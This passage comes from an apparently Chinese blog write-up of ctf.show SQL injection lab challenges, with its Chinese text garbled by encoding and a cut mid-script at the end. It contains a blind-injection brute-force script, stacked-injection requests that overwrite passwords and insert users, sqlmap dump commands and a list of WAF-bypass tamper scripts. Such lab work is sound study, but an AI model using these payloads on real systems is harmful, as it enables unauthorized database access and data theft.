·,ä»£ç åŒä¸Š</p><ul><li><p>ç›´æ¥çŒœ</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    @Author disda</span></span><br><span class="line"><span class="string">    @Date 2023/5/26 10:11</span></span><br><span class="line"><span class="string">    @Describe </span></span><br><span class="line"><span class="string">    @Dependency</span></span><br><span class="line"><span class="string">    @Version 1.0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">url = <span class="string">&#x27;http://741281c8-2d94-48a5-9828-84f8186ae64d.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># likeçš„è¯ï¼Œä¸‹åˆ’çº¿æ”¾æœ€åï¼Œå› ä¸ºç›¸å½“äºæ˜¯åŒ¹é…ä»»æ„å­—ç¬¦</span></span><br><span class="line">letter = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-,&#123;&#125;_&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> letter:</span><br><span class="line">        <span class="comment"># çˆ†åº“å</span></span><br><span class="line">        <span class="comment"># payload = &quot;&#x27; or if((select group_concat(database())) like &#x27;&#123;&#125;&#x27;,1,0) =&#x27;1&quot;.format(flag + j + &quot;%&quot;)</span></span><br><span class="line">        <span class="comment"># çˆ†è¡¨å</span></span><br><span class="line">        <span class="comment"># payload = &quot;&#x27; or if((select group_concat(table_name) from information_schema.tables where(table_schema=database()) ) like &#x27;&#123;&#125;&#x27;,1,0) =&#x27;1&quot;.format(flag+j+&quot;%&quot;)</span></span><br><span class="line">        <span class="comment"># çˆ†å­—æ®µå</span></span><br><span class="line">        <span class="comment"># payload = &quot;&#x27; or if((select group_concat(column_name) from information_schema.columns where(table_name=&#x27;ctfshow_flxg&#x27;) ) like &#x27;&#123;&#125;&#x27;,1,0) =&#x27;1&quot;.format(flag + j + &quot;%&quot;)</span></span><br><span class="line">        <span class="comment"># çˆ†å­—æ®µ</span></span><br><span class="line">        payload = <span class="string">&quot;&#x27; or if((select group_concat(f1ag) from ctfshow_flxg) like &#x27;&#123;&#125;&#x27;,1,0) =&#x27;1&quot;</span>.<span class="built_in">format</span>(flag+j+<span class="string">&quot;%&quot;</span>)</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>:payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>:<span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;å¯†ç é”™è¯¯&quot;</span> == res.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            sys.exit()</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h4><span id="web195">web195</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span><br><span class="line">  $sql = &quot;select pass from ctfshow_user where username = &#123;$username&#125;;&quot;;</span><br></pre></td></tr></table></figure><ul><li><p>ä½¿ç”¨updateè¯­å¥ç™»å½•ï¼Œå°†adminä½¿ç”¨hexç¼–ç (<code>$username</code>æ²¡æœ‰è¢«å•å¼•å·åŒ…è£¹)</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>33f6e930-7cb7-4763-92c1-0b8bcfd8e6d7.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>68</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://33f6e930-7cb7-4763-92c1-0b8bcfd8e6d7.challenge.ctf.show</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://33f6e930-7cb7-4763-92c1-0b8bcfd8e6d7.challenge.ctf.show/select-stacked.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-n1ql">username=0x61646d696e;<span class="keyword">update</span><span class="symbol">`ctfshow_user`</span><span class="keyword">set</span><span class="symbol">`pass`</span>=<span class="number">123</span>&amp;<span class="keyword">password</span>=<span class="number">123</span></span></span><br></pre></td></tr></table></figure></li></ul><h4><span id="web196">web196</span></h4><p><strong>å †å æ³¨å…¥</strong></p><p>é¡¾åæ€ä¹‰ï¼Œå †å æ³¨å…¥å°±æ˜¯å°†ä¸€å †sqlè¯­å¥å åŠ åœ¨ä¸€èµ·æ‰§è¡Œï¼Œä½¿ç”¨åˆ†å·ç»“æŸä¸Šä¸€ä¸ªè¯­å¥å†å åŠ å…¶ä»–è¯­å¥ä¸€èµ·æ‰§è¡Œã€‚</p><p>ç¬¬ä¸€ä¸ªè¿”å›ç©ºï¼Œç¬¬äºŒä¸ªè¿”å›1ï¼Œå¯†ç ä¹Ÿæ˜¯1ï¼Œé€»è¾‘æˆç«‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="number">0</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;ç™»é™†æˆåŠŸ flag is <span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>63ebcf3e-f52f-4dc2-afaf-f6e6709f904c.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>33</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://63ebcf3e-f52f-4dc2-afaf-f6e6709f904c.challenge.ctf.show</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://63ebcf3e-f52f-4dc2-afaf-f6e6709f904c.challenge.ctf.show/select-stacked.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">username</span>=<span class="number">0</span>%<span class="number">3</span>Bselect(<span class="number">2</span>)&amp;password=<span class="number">2</span></span></span><br></pre></td></tr></table></figure><h4><span id="web197">web197</span></h4><p><strong>æ’å…¥æ•°æ®</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0;insert  ctfshow_user(`username`,`pass`) value(0,0);</span><br><span class="line">0</span><br></pre></td></tr></table></figure><h4><span id="web198">web198</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0;show tables;</span><br><span class="line">ctfshow_user</span><br></pre></td></tr></table></figure><h4><span id="web-201">web 201</span></h4><ul><li><p>å¼€å§‹ä½¿ç”¨sqlmap</p><p>æ ¹æ®æç¤ºï¼ŒåŠ ä¸Šrefer</p></li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u ba331644-ca02-<span class="number">4</span>ccf-b446-<span class="number">5</span>ad5b3629eff.challenge.ctf.show/api/?id=<span class="number">1</span> --refer=http://ba331644-ca02-<span class="number">4</span>ccf-b446-<span class="number">5</span>ad5b3629eff.challenge.ctf.show/sqlmap.php --tables</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u ba331644-ca02-<span class="number">4</span>ccf-b446-<span class="number">5</span>ad5b3629eff.challenge.ctf.show/api/?id=<span class="number">1</span> --refer=http://ba331644-ca02-<span class="number">4</span>ccf-b446-<span class="number">5</span>ad5b3629eff.challenge.ctf.show/sqlmap.php -T ctfshow_user --columns</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u ba331644-ca02-<span class="number">4</span>ccf-b446-<span class="number">5</span>ad5b3629eff.challenge.ctf.show/api/?id=<span class="number">1</span> --refer=http://ba331644-ca02-<span class="number">4</span>ccf-b446-<span class="number">5</span>ad5b3629eff.challenge.ctf.show/sqlmap.php -T ctfshow_user --columns</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u ba331644-ca02-<span class="number">4</span>ccf-b446-<span class="number">5</span>ad5b3629eff.challenge.ctf.show/api/?id=<span class="number">1</span> --refer=http://ba331644-ca02-<span class="number">4</span>ccf-b446-<span class="number">5</span>ad5b3629eff.challenge.ctf.show/sqlmap.php -T ctfshow_user -C pass --dump</span><br></pre></td></tr></table></figure><h4><span id="web202">web202</span></h4><ul><li>Sqlmap postç”¨æ³•</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://fcae001f-d669-<span class="number">430</span>c-b2ee-<span class="number">8</span>fb20fe927d2.challenge.ctf.show/api/?id=<span class="number">1</span> --data=&quot;id=<span class="number">1</span>&quot; --refer=http://fcae001f-d669-<span class="number">430</span>c-b2ee-<span class="number">8</span>fb20fe927d2.challenge.ctf.show/sqlmap.php --dbs</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u http://fcae001f-d669-<span class="number">430</span>c-b2ee-<span class="number">8</span>fb20fe927d2.challenge.ctf.show/api/?id=<span class="number">1</span> --data=&quot;id=<span class="number">1</span>&quot; --refer=http://fcae001f-d669-<span class="number">430</span>c-b2ee-<span class="number">8</span>fb20fe927d2.challenge.ctf.show/sqlmap.php --tables</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u http://fcae001f-d669-<span class="number">430</span>c-b2ee-<span class="number">8</span>fb20fe927d2.challenge.ctf.show/api/?id=<span class="number">1</span> --data=&quot;id=<span class="number">1</span>&quot; --refer=http://fcae001f-d669-<span class="number">430</span>c-b2ee-<span class="number">8</span>fb20fe927d2.challenge.ctf.show/sqlmap.php -T ctfshow_user --columns</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u http://fcae001f-d669-<span class="number">430</span>c-b2ee-<span class="number">8</span>fb20fe927d2.challenge.ctf.show/api/?id=<span class="number">1</span> --data=&quot;id=<span class="number">1</span>&quot; --refer=http://fcae001f-d669-<span class="number">430</span>c-b2ee-<span class="number">8</span>fb20fe927d2.challenge.ctf.show/sqlmap.php -T ctfshow_user -C pass --dump</span><br></pre></td></tr></table></figure><h4><span id="web203">web203</span></h4><p>è®°å¾—è¦åŠ ä¸Šâ€“headers&#x3D;â€Content-Type: text&#x2F;plainâ€ ä¸ç„¶dataæ˜¯ä»¥è¡¨å•å½¢å¼å‘é€</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://<span class="number">4</span>bed30ca-<span class="number">53</span>ef-<span class="number">4</span>c44-a5e1-<span class="number">91</span>eeaf63d4c0.challenge.ctf.show/api/index.php --method=PUT --headers=&quot;Content-<span class="built_in">Type</span>: text/plain&quot; --data=&quot;id=<span class="number">1</span>&quot; --refer=ctf.show --current-db --tables -T ctfshow_user --columns  -C pass -dump</span><br></pre></td></tr></table></figure><h4><span id="web-204">web 204</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py http://617aeb7f-5ecd-44a3-9040-2a7a39def7f5.challenge.ctf.show/api/index.php --method=&quot;PUT&quot; --data=&quot;id=1&quot; --refer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --cookie=&quot;PHPSESSID=p9mkuj9vngdtei0cd6efjce6pn; ctfshow=eb51da0e22ab707da3add55108b2d346&quot; -T ctfshow_user -C pass --dump</span><br></pre></td></tr></table></figure><h4><span id="web-205">web 205</span></h4><p>æŠ“åŒ…å‘ç°å…ˆè®¿é—®<code>/api/getToken.php</code>é¡µé¢ï¼ŒéªŒè¯PHPSESSIDåæ‰èƒ½é€šè¿‡ï¼Œå»è®¿é—®<code>/api/</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1ã€--safe-urlï¼šæä¾›ä¸€ä¸ªå®‰å…¨ä¸é”™è¯¯çš„è¿æ¥ï¼Œæ¯éš”ä¸€æ®µæ—¶é—´éƒ½ä¼šå»è®¿é—®ä¸€ä¸‹ã€‚</span><br><span class="line">2ã€--safe-freqï¼šæä¾›ä¸€ä¸ªå®‰å…¨ä¸é”™è¯¯çš„è¿æ¥ï¼Œæ¯æ¬¡æµ‹è¯•è¯·æ±‚ä¹‹åéƒ½ä¼šå†è®¿é—®ä¸€éå®‰å…¨è¿æ¥ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://<span class="number">9982</span>c70a-d4b0-<span class="number">45</span>f1-b247-<span class="number">871</span>e538c14b0.challenge.ctf.show/api/index.php --method=PUT --headers=&quot;Content-<span class="built_in">Type</span>: text/plain&quot; --data=&quot;id=<span class="number">1</span>&quot; --refer=ctf.show --safe-url=<span class="number">9982</span>c70a-d4b0-<span class="number">45</span>f1-b247-<span class="number">871</span>e538c14b0.challenge.ctf.show/api/getToken.php --safe-freq=<span class="number">1</span> --current-db --tables -T ctfshow_flax --columns -C flagx --dump</span><br></pre></td></tr></table></figure><h4><span id="web206">web206</span></h4><p>å¯ä»¥æé«˜levelç­‰çº§ï¼Œæé«˜levelå°±ä¼šæ‰§è¡Œæ›´å¤šçš„payload,åŒæ—¶æ‰§è¡Œé€Ÿåº¦ä¹Ÿä¼šå˜æ…¢(è¿™é¢˜å…¶å®ä¸éœ€è¦)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--level=LEVEL è®¾ç½®æµ‹è¯•ç­‰çº§ï¼ˆ1-5ï¼Œé»˜è®¤ä¸º 1ï¼‰</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://e1e4b812-<span class="number">10</span>a3-<span class="number">4</span>fdf-<span class="number">991</span>a-<span class="number">405337841416</span>.challenge.ctf.show/api/index.php --method=PUT --headers=&quot;Content-<span class="built_in">Type</span>: text/plain&quot; --data=&quot;id=<span class="number">1</span>&quot; --refer=ctf.show --safe-url=http://e1e4b812-<span class="number">10</span>a3-<span class="number">4</span>fdf-<span class="number">991</span>a-<span class="number">405337841416</span>.challenge.ctf.show/api/getToken.php --safe-freq=<span class="number">1</span> --current-db --tables -T ctfshow_flaxc -C flagv --dump --level=<span class="number">3</span></span><br></pre></td></tr></table></figure><h4><span id="web207">web207</span></h4><p>è¿‡æ»¤äº†ç©ºæ ¼,å¯ä»¥ç”¨<code>--tamper</code>æ¥ä¿®æ”¹æ³¨å…¥çš„æ•°æ®</p><p><a href="https://blog.csdn.net/qq_34444097/article/details/82717357">å¸¸è§çš„tamperè„šæœ¬</a></p><blockquote><p>space2comment.pyç”¨&#x2F;**&#x2F;ä»£æ›¿ç©ºæ ¼</p><p>apostrophemask.pyç”¨utf8ä»£æ›¿å¼•å·</p><p>equaltolike.pylikeä»£æ›¿ç­‰å·</p><p>space2dash.pyã€€ç»•è¿‡è¿‡æ»¤â€˜&#x3D;â€™ æ›¿æ¢ç©ºæ ¼å­—ç¬¦ï¼ˆâ€ï¼‰ï¼Œï¼ˆâ€™â€“â€˜ï¼‰åè·Ÿä¸€ä¸ªç ´æŠ˜å·æ³¨é‡Šï¼Œä¸€ä¸ªéšæœºå­—ç¬¦ä¸²å’Œä¸€ä¸ªæ–°è¡Œï¼ˆâ€™nâ€™ï¼‰</p><p>greatest.pyã€€ç»•è¿‡è¿‡æ»¤â€™&gt;â€™ ,ç”¨GREATESTæ›¿æ¢å¤§äºå·ã€‚</p><p>space2hash.pyç©ºæ ¼æ›¿æ¢ä¸º#å·,éšæœºå­—ç¬¦ä¸²ä»¥åŠæ¢è¡Œç¬¦</p><p>apostrophenullencode.pyç»•è¿‡è¿‡æ»¤åŒå¼•å·ï¼Œæ›¿æ¢å­—ç¬¦å’ŒåŒå¼•å·ã€‚</p><p>halfversionedmorekeywords.pyå½“æ•°æ®åº“ä¸ºmysqlæ—¶ç»•è¿‡é˜²ç«å¢™ï¼Œæ¯ä¸ªå…³é”®å­—ä¹‹å‰æ·»åŠ mysqlç‰ˆæœ¬è¯„è®º</p><p>space2morehash.pyç©ºæ ¼æ›¿æ¢ä¸º #å· ä»¥åŠæ›´å¤šéšæœºå­—ç¬¦ä¸² æ¢è¡Œç¬¦</p><p>appendnullbyte.pyåœ¨æœ‰æ•ˆè´Ÿè·ç»“æŸä½ç½®åŠ è½½é›¶å­—èŠ‚å­—ç¬¦ç¼–ç </p><p>ifnull2ifisnull.pyã€€ç»•è¿‡å¯¹IFNULLè¿‡æ»¤,æ›¿æ¢ç±»ä¼¼â€™IFNULL(A,B)â€™ä¸ºâ€™IF(ISNULL(A), B, A)â€™</p><p>space2mssqlblank.py(mssql)ç©ºæ ¼æ›¿æ¢ä¸ºå…¶å®ƒç©ºç¬¦å·</p><p>base64encode.pyã€€ç”¨base64ç¼–ç æ›¿æ¢</p><p>space2mssqlhash.pyã€€æ›¿æ¢ç©ºæ ¼</p><p>modsecurityversioned.pyè¿‡æ»¤ç©ºæ ¼ï¼ŒåŒ…å«å®Œæ•´çš„æŸ¥è¯¢ç‰ˆæœ¬æ³¨é‡Š</p><p>space2mysqlblank.pyã€€ç©ºæ ¼æ›¿æ¢å…¶å®ƒç©ºç™½ç¬¦å·(mysql)</p><p>between.pyç”¨betweenæ›¿æ¢å¤§äºå·ï¼ˆ&gt;ï¼‰</p><p>space2mysqldash.pyæ›¿æ¢ç©ºæ ¼å­—ç¬¦ï¼ˆâ€ï¼‰ï¼ˆâ€™ â€“ â€˜ï¼‰åè·Ÿä¸€ä¸ªç ´æŠ˜å·æ³¨é‡Šä¸€ä¸ªæ–°è¡Œï¼ˆâ€™ nâ€™ï¼‰</p><p>multiplespaces.pyå›´ç»•SQLå…³é”®å­—æ·»åŠ å¤šä¸ªç©ºæ ¼</p><p>space2plus.pyç”¨+æ›¿æ¢ç©ºæ ¼</p><p>bluecoat.pyä»£æ›¿ç©ºæ ¼å­—ç¬¦åä¸ä¸€ä¸ªæœ‰æ•ˆçš„éšæœºç©ºç™½å­—ç¬¦çš„SQLè¯­å¥,ç„¶åæ›¿æ¢&#x3D;ä¸ºlike</p><p>nonrecursivereplacement.pyåŒé‡æŸ¥è¯¢è¯­å¥,å–ä»£SQLå…³é”®å­—</p><p>space2randomblank.pyä»£æ›¿ç©ºæ ¼å­—ç¬¦ï¼ˆâ€œâ€ï¼‰ä»ä¸€ä¸ªéšæœºçš„ç©ºç™½å­—ç¬¦å¯é€‰å­—ç¬¦çš„æœ‰æ•ˆé›†</p><p>sp_password.pyè¿½åŠ sp_passwordâ€™ä»DBMSæ—¥å¿—çš„è‡ªåŠ¨æ¨¡ç³Šå¤„ç†çš„æœ‰æ•ˆè½½è·çš„æœ«å°¾</p><p>chardoubleencode.pyåŒurlç¼–ç (ä¸å¤„ç†ä»¥ç¼–ç çš„)</p><p>unionalltounion.pyæ›¿æ¢UNION ALLSELECT UNION SELECT</p><p>charencode.pyã€€urlç¼–ç </p><p>randomcase.pyéšæœºå¤§å°å†™</p><p>unmagicquotes.pyå®½å­—ç¬¦ç»•è¿‡ GPCaddslashes</p><p>randomcomments.pyç”¨&#x2F;**&#x2F;åˆ†å‰²sqlå…³é”®å­—</p><p>charunicodeencode.pyå­—ç¬¦ä¸² unicode ç¼–ç </p><p>securesphere.pyè¿½åŠ ç‰¹åˆ¶çš„å­—ç¬¦ä¸²</p><p>versionedmorekeywords.pyæ³¨é‡Šç»•è¿‡</p><p>space2comment.pyæ›¿æ¢ç©ºæ ¼å­—ç¬¦ä¸²(â€˜â€˜) ä½¿ç”¨æ³¨é‡Šâ€˜&#x2F;**&#x2F;â€™</p><p>halfversionedmorekeywords.pyå…³é”®å­—å‰åŠ æ³¨é‡Š</p></blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://<span class="number">04</span>a724c7-<span class="number">1</span>a0c-<span class="number">4124</span>-b6f5-<span class="number">99</span>d2ed8f4899.challenge.ctf.show/api/index.php --safe-url=http://<span class="number">04</span>a724c7-<span class="number">1</span>a0c-<span class="number">4124</span>-b6f5-<span class="number">99</span>d2ed8f4899.challenge.ctf.show/api/getToken.php --safe-freq=<span class="number">1</span> -method=PUT --headers=&quot;Content-<span class="built_in">Type</span>: text/plain&quot; --data=&quot;id=<span class="number">1</span>&quot; --dbms=mysql --current-db --tables  -T ctfshow_flaxca  --columns -C flagvc --dump  --level=<span class="number">3</span> --tamper=space2comment</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4><span id="web-207">web 207</span></h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://<span class="number">103309</span>c4-<span class="number">1619</span>-<span class="number">45</span>a2-<span class="number">84</span>ec-<span class="number">56</span>b906282010.challenge.ctf.show/api/index.php&quot; --method=&quot;PUT&quot; --data=&quot;id=<span class="number">1</span>&quot; --referer=ctf.show --headers=&quot;Content-<span class="built_in">Type</span>: text/plain&quot; --cookie=&quot;PHPSESSID=<span class="number">1</span>vrv4fg7q4uid8i1lhma043h20&quot; --safe-url=&quot;http://<span class="number">103309</span>c4-<span class="number">1619</span>-<span class="number">45</span>a2-<span class="number">84</span>ec-<span class="number">56</span>b906282010.challenge.ctf.show/api/getToken.php&quot; --safe-freq=<span class="number">1</span> --tamper=space2comment.py,uppercase.py -D ctfshow_web -T ctfshow_flaxcac -C flagvca --dump</span><br></pre></td></tr></table></figure><h4><span id="web209">Web209</span></h4><p><a href="https://y4er.com/posts/sqlmap-tamper/">è‡ªå®šä¹‰tamper</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    @Author disda</span></span><br><span class="line"><span class="string">    @Date 2023/6/6 10:07</span></span><br><span class="line"><span class="string">    @Describe </span></span><br><span class="line"><span class="string">    @Dependency</span></span><br><span class="line"><span class="string">    @Version 1.0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2021 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">&quot;&quot;</span></span><br><span class="line">        quote, doublequote, firstspace = <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(payload)):</span><br><span class="line">            <span class="comment"># 